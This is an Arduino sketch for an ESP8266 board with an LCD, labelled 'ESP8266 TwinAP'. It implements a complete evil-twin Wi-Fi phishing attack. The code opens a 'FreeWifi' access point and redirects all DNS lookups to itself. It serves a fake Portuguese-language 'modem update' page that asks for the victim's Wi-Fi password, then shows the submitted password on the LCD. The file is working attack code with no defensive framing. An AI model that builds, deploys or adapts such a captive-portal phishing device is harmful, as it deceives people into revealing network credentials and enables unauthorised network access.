#include <Arduino.h>

#include <ESP8266WiFi.h>
#include "./DNSServer.h"                  // Patched lib
#include <ESP8266WebServer.h>
#include <LiquidCrystal_I2C.h>
LiquidCrystal_I2C lcd(0x27, 16, 2);

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
IPAddress         apIP(10, 10, 10, 1);    // Private network for server
DNSServer         dnsServer;              // Create the DNS object
ESP8266WebServer  server(80);          // HTTP server

String responseHTML = "<!DOCTYPE html><html><head><title>CaptivePortal</title><meta charset='utf-8'></head><body><h1>Atualização em andamento.</h1><p>Seu modem está sendo atualizado, para finalizar a atualização, confirme a senha de seu Wifi:</p><form action='/submit' method='GET'><input id='pass' name='pass' type='password'/></br><button type='submit'>Enviar</button></form></body></html>";


void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("FreeWifi");
  lcd.begin(16,2);
  lcd.init();
  lcd.backlight();
  lcd.setCursor(1,0);
  lcd.print("ESP8266 TwinAP");
  lcd.setCursor(0,1);
  lcd.print("Tarik Caramanico");
  delay(800);
  lcd.clear();
  escreveOk("Wifi", 16, 0);
  dnsServer.start(DNS_PORT, "*", apIP);
  delay(1000);
  escreveOk("DNS", 16, 1);
  server.onNotFound([]() {
    server.send(200, "text/html", responseHTML);
  });
  server.on("/submit", handleSubmit);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

void handleSubmit(){
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Senha recebida:");
  lcd.setCursor(0, 1);
  lcd.print(server.arg("pass"));
  server.send(200, "text/html", "<!DOCTYPE html><html><head><title>CaptivePortal</title><meta charset='utf-8'></head><body><h1>Senha confirmada, aguarde o reestabelecimento de sua conexão.</h1></body></html>");
  }

void clearLine(int linha, int colunas){
  for(int i = 0; i<=colunas; i++){
    lcd.setCursor(i,linha);
    lcd.print(" ");
  }
}
int len(String s){
  int i;
  for(i = 0; s[i] != '\0'; ++i);
  return i;
}
void escreveOk(String palavra, int colunas, int linha){
  clearLine(linha, 16);
  lcd.setCursor(0,linha);
  lcd.print(palavra);
  delay(300);
  for(int i = len(palavra); i<=colunas-2;i++){
    lcd.print(".");
    lcd.setCursor(i,linha);
    delay(300);
  }
  lcd.print("OK");
}
